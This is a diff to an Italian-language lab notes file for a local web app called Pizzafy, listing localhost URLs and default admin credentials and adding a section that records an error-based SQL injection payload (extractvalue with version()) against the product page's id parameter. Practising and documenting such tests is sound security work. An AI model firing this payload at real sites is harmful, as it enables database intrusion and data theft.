@@ -45,3 +45,16 @@ sito pizzafy: http://localhost/pizzafy/Pizzafy/
 login amministratore: http://localhost/pizzafy/Pizzafy/admin/login.php
 
 Credenziali → Username: admin@gmail.com  Password: admin123
+
+## SQL injection
+Specificatamente SQL Injection Error-Based restituendo l’errore in XML
+### URL di testing
+Primo con metodo GET :  [http://localhost/Pizzafy/pizzafy/view_prod.php?id=](http://localhost/Pizzafy/pizzafy/view_prod.php?id=)
+### Payload di test
+```markdown
+
+9%20AND%20extractvalue(rand(),%20concat(0x7e,version()))%20--
+
+```
+#### Output:
+![[payload-version.png]]
